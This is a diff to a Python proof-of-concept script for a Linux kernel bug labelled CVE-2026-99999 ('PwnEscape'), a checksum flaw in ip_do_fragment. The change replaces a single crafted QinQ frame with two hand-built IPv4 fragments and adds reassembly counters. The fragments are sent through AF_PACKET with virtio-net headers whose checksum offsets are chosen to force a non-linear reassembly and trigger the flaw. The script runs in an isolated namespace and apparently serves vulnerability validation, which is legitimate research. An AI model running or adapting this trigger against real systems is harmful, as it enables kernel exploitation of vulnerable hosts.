@@ -3,9 +3,9 @@
 CVE-2026-99999 (PwnEscape) -- bounded functional validation.
 
 Runs entirely inside a fresh user+network namespace (invoke via: unshare -Urn).
-All traffic stays on two private veth pairs created inside that namespace; two
-QinQ-tagged 1622-byte frames are sent (one control, one active). No external
-traffic.
+All traffic stays on two private veth pairs created inside that namespace.
+Each control/active case sends two QinQ-tagged IPv4 ingress fragments to force
+non-linear reassembly. No external traffic.
 
 Mechanism (Linux 6.1, pre-fix ip_do_fragment):
   1. AF_PACKET TX with PACKET_VNET_HDR marks the skb CHECKSUM_PARTIAL with
@@ -239,8 +239,8 @@ def hdr_checksum(data):
     return fold_sum(wsum(data))
 
 
-def ip_header(tot, ident, ttl, check, src, dst):
-    return struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, tot, ident, 0x0000,
+def ip_header(tot, ident, ttl, check, src, dst, frag=0):
+    return struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, tot, ident, frag,
                        ttl, 17, check, src, dst)
 
 
@@ -280,10 +280,13 @@ def snmp_counters():
 
 
 def build_case(ident, csum_start, csum_off, payload):
-    """Return (tx_bytes, datagram_as_kernel_sees_it)."""
+    """Return ([two ingress IP fragments], reassembled kernel datagram).
+
+    The first ingress fragment carries exactly eight bytes after its IPv4
+    header. Linux reassembly therefore yields a 28-byte linear head
+    (20-byte IPv4 header + 8 bytes) with the remaining data non-linear.
+    """
     tot = DGRAM_LEN
-    hdr64 = ip_header(tot, ident, 64, 0, IP_SRC, IP_DST)
-    hdr64 = ip_header(tot, ident, 64, hdr_checksum(hdr64), IP_SRC, IP_DST)
     # ip_forward decrements TTL (64 -> 63) and fixes the header checksum,
     # so the checksum skb_checksum_help() computes covers this header:
     hdr63 = ip_header(tot, ident, 63, 0, IP_SRC, IP_DST)
@@ -291,16 +294,25 @@ def build_case(ident, csum_start, csum_off, payload):
     udp = udp_header(0x1111, 0x2222, 8 + len(payload))
     datagram = hdr63 + udp + payload
 
-    vnet = struct.pack(VNET_HDR_FMT, VIRTIO_NET_HDR_F_NEEDS_CSUM,
-                       VIRTIO_NET_HDR_GSO_NONE,
-                       VNET_HDR_LEN,                # QinQ + IPv4 + UDP
-                       0,                           # no GSO; only partial checksum
-                       csum_start, csum_off)
+    first_data = udp[:8]
+    second_data = payload
+    hdr1 = ip_header(20 + len(first_data), ident, 64, 0, IP_SRC, IP_DST, 0x2000)
+    hdr1 = ip_header(20 + len(first_data), ident, 64, hdr_checksum(hdr1),
+                     IP_SRC, IP_DST, 0x2000)
+    hdr2 = ip_header(20 + len(second_data), ident, 64, 0, IP_SRC, IP_DST, 1)
+    hdr2 = ip_header(20 + len(second_data), ident, 64, hdr_checksum(hdr2),
+                     IP_SRC, IP_DST, 1)
+
+    vnet_first = struct.pack(VNET_HDR_FMT, VIRTIO_NET_HDR_F_NEEDS_CSUM,
+                             VIRTIO_NET_HDR_GSO_NONE,
+                             VNET_HDR_LEN, 0, csum_start, csum_off)
+    vnet_rest = struct.pack(VNET_HDR_FMT, 0, VIRTIO_NET_HDR_GSO_NONE,
+                            0, 0, 0, 0)
     eth = (bytes(MAC_IN_RX) + bytes(MAC_IN_TX)
            + struct.pack("!HHHHH", 0x8100, VLAN_OUTER,
                          0x8100, VLAN_INNER, ETH_P_IP))
-    tx = vnet + eth + hdr64 + udp + payload
-    return tx, datagram
+    return [vnet_first + eth + hdr1 + first_data,
+            vnet_rest + eth + hdr2 + second_data], datagram
 
 
 def tune_payload(hdr63, udp, plen):
@@ -490,9 +502,10 @@ def main():
     payload_c = b"\xA5" * payload_len
     tx_c, _ = build_case(0x6001, CSUM_START_CONTROL, 6, payload_c)
     tx = open_tx_socket()
-    out("send_stage", case="control", step="before", bytes=len(tx_c))
-    sent_c = tx.send(tx_c)
-    out("send_stage", case="control", step="after", bytes=sent_c)
+    for part, frame in enumerate(tx_c, 1):
+        out("send_stage", case="control", part=part, step="before", bytes=len(frame))
+        sent_c = tx.send(frame)
+        out("send_stage", case="control", part=part, step="after", bytes=sent_c)
     tx.close()
     frames_c = collect(cap, 1.5)
     ctrl_frags = report_case("control", frames_c, 0x6001, payload_c, ctrl_udp_check)
@@ -503,10 +516,11 @@ def main():
         payload_head=payload_a[:8].hex())
     tx_a, datagram = build_case(0x6002, CSUM_START_ACTIVE, 0, payload_a)
     tx = open_tx_socket()
-    out("send_stage", case="active", step="before", bytes=len(tx_a))
+    out("send_stage", case="active", step="before", fragments=len(tx_a))
     try:
-        sent_a = tx.send(tx_a)
-        out("send_stage", case="active", step="after", bytes=sent_a)
+        for part, frame in enumerate(tx_a, 1):
+            sent_a = tx.send(frame)
+            out("send_stage", case="active", part=part, step="after", bytes=sent_a)
     except OSError as exc:
         out("send_stage", case="active", step="error", errno=exc.errno,
             strerror=exc.strerror)
@@ -522,7 +536,8 @@ def main():
     act_frags = report_case("active", frames_a, 0x6002, payload_a, None)
 
     after = snmp_counters()
-    for key in ("FragOKs", "FragCreates", "FragFails", "ForwDatagrams"):
+    for key in ("ReasmOKs", "ReasmFails", "FragOKs", "FragCreates",
+                "FragFails", "ForwDatagrams"):
         if key in before and key in after:
             out("counter", name=key, before=before[key], after=after[key],
                 delta=after[key] - before[key])
